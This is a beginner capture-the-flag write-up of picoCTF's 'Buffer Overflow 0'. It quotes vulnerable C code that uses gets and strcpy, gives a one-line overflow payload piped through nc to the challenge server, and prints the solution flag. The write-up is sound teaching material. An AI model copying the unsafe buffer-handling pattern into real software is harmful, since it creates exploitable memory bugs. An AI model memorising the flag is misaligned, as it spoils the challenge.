# Buffer Overflow 0

## Metadata

- Platform: CyLab Academy / picoCTF
- Learning Path: The Beginner's Guide to the Challenge Library
- Category: Binary Exploitation
- Difficulty: Beginner
- Status: Solved
- Started: 2026-08-17
- Completed: 2026-08-17
- Files: `vuln`, `vuln.c`
- Skills Learned: C source review, unsafe input functions, stack buffer overflow, remote service testing

## Problem Summary

The challenge gives a vulnerable C program and a remote service:

```sh
nc saturn.picoctf.net 49871
```

The goal is to overflow the correct buffer. In this program, causing a
segmentation fault is enough because the signal handler prints the flag.

## First Observations

The binary is a 32-bit Linux executable:

```text
ELF 32-bit LSB pie executable, Intel 80386
```

On macOS, the binary is useful for inspection but not directly runnable without
a Linux environment. The source is enough to solve the challenge.

The program reads `flag.txt`, registers a segmentation-fault handler, then asks
for input:

```c
signal(SIGSEGV, sigsegv_handler);
printf("Input: ");
char buf1[100];
gets(buf1);
vuln(buf1);
```

The handler prints the flag:

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

## Key Idea

**This challenge wants a crash.**

Usually a segmentation fault means the exploit failed. Here, the program has a
custom `SIGSEGV` handler that prints the flag. So the goal is simply to provide
enough input to overflow the smaller buffer and crash the program.

The dangerous copy happens in `vuln()`:

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

`buf2` has room for only 16 bytes, but `strcpy()` keeps copying until it reaches
a null byte. A long input overwrites past `buf2`, corrupts the stack, and
eventually triggers `SIGSEGV`.

## Solution Walkthrough

1. Read `vuln.c`.
2. Notice `gets(buf1)` accepts unchecked user input.
3. Notice `strcpy(buf2, input)` copies that input into a 16-byte buffer.
4. Notice `sigsegv_handler()` prints `flag`.
5. Send a long string to the remote service.

The exact payload does not need careful address control. A simple long line is
enough:

```sh
python3 -c "print('A'*100)" | nc saturn.picoctf.net 49871
```

Output:

```text
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Commands Or Script

From the challenge directory:

```sh
file vuln vuln.c
sed -n '1,120p' vuln.c
python3 -c "print('A'*100)" | nc saturn.picoctf.net 49871
```

## Flag

```text
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Lessons Learned

- `gets()` is unsafe because it does not know the destination buffer size.
- `strcpy()` is unsafe when the source length is not checked against the
  destination buffer size.
- Not every binary exploitation challenge needs shellcode or return-address
  control. Sometimes triggering the intended crash path is enough.
- Read signal handlers. They can change what "crashing the program" means.

## Follow-Up

- For later buffer overflow challenges, start by identifying buffer sizes,
  unsafe input/copy functions, and whether the goal is to crash, redirect
  control flow, or call a specific function.
